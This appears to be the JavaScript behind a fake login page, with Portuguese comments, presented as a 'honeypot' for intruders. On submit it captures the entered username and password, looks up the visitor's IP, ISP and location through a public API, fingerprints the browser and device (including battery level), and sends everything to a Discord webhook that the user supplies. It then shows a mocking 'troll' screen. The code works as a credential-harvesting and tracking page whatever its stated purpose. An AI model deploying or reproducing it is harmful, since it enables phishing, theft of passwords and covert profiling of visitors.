async function triggerTrap(event) {
    event.preventDefault();

    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;
    const consoleOutput = document.getElementById('console-output');

    // 1. Simula console de conexão
    consoleOutput.classList.remove('hidden');
    consoleOutput.innerHTML = `
        <p class="text-amber-400">> Capturando impressão digital do navegador...</p>
        <p class="text-slate-500">> Processando IP e geolocalização...</p>
        <p class="text-emerald-400 animate-pulse">> Transmitindo alerta de intrusão...</p>
    `;

    // 2. Extrai telemetria completa
    const targetData = await coletarDadosNavegador(user, pass);

    // 3. Notifica seu Webhook do Discord
    await enviarAlertaDiscord(targetData);

    // 4. Revela a tela do Honeypot
    setTimeout(() => {
        document.getElementById('login-card').classList.add('hidden');
        
        const trollScreen = document.getElementById('troll-screen');
        document.getElementById('captured-payload').innerText = `User: "${user}" | Pass: "${pass}"`;
        document.getElementById('captured-ua').innerText = targetData.userAgent;
        
        trollScreen.classList.remove('hidden');
    }, 1800);
}

// Coleta avançada de dados do visitante
async function coletarDadosNavegador(user, pass) {
    let ipInfo = { ip: "Desconhecido", city: "?", region: "?", country_name: "?", org: "?" };

    try {
        const res = await fetch('https://ipapi.co/json/');
        if (res.ok) {
            ipInfo = await res.json();
        }
    } catch (e) {
        console.warn("Não foi possível resolver o IP via API pública", e);
    }

    let batteryLevel = "N/A";
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            batteryLevel = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Carregando)' : ''}`;
        } catch (e) {}
    }

    return {
        user,
        pass,
        ip: ipInfo.ip,
        local: `${ipInfo.city || '?'}, ${ipInfo.region || '?'}, ${ipInfo.country_name || '?'}`,
        isp: ipInfo.org || 'Desconhecido',
        userAgent: navigator.userAgent,
        plataforma: navigator.platform,
        idioma: navigator.language,
        resolucao: `${window.screen.width}x${window.screen.height}`,
        fusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone,
        bateria: batteryLevel,
        referrer: document.referrer || 'Acesso Direto'
    };
}

// Disparo para o Webhook do Discord
async function enviarAlertaDiscord(data) {
    // ⚠️ SUBSTITUA COM O SEU WEBHOOK DO DISCORD SE QUISER RECEBER OS NOTIFICAÇÕES:
    const DISCORD_WEBHOOK_URL = ""; 

    if (!DISCORD_WEBHOOK_URL) return;

    const embedPayload = {
        embeds: [{
            title: "🚨 HONEYPOT TRIGGERED - Intrusão Capturada!",
            color: 15158332,
            fields: [
                {
                    name: "🔑 Credenciais Inseridas",
                    value: `**Usuário:** \`${data.user}\` \n**Senha:** \`${data.pass}\``,
                    inline: false
                },
                {
                    name: "🌐 IP & Geolocalização",
                    value: `**IP:** \`${data.ip}\`\n**ISP:** ${data.isp}\n**Local:** ${data.local}`,
                    inline: false
                },
                {
                    name: "💻 Sistema / Hardware",
                    value: `**OS:** ${data.plataforma}\n**Resolução:** ${data.resolucao}\n**Idioma:** ${data.idioma}\n**Fuso Horário:** ${data.fusoHorario}\n**Bateria:** ${data.bateria}`,
                    inline: true
                },
                {
                    name: "🔍 Fingerprint Navegador",
                    value: `**Referrer:** ${data.referrer}\n**User-Agent:** \`\`\`${data.userAgent}\`\`\``,
                    inline: false
                }
            ],
            footer: {
                text: "Security Telemetry - Landing Page Honeypot"
            },
            timestamp: new Date().toISOString()
        }]
    };

    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(embedPayload)
        });
    } catch (e) {
        console.error("Erro ao enviar logs ao Discord:", e);
    }
}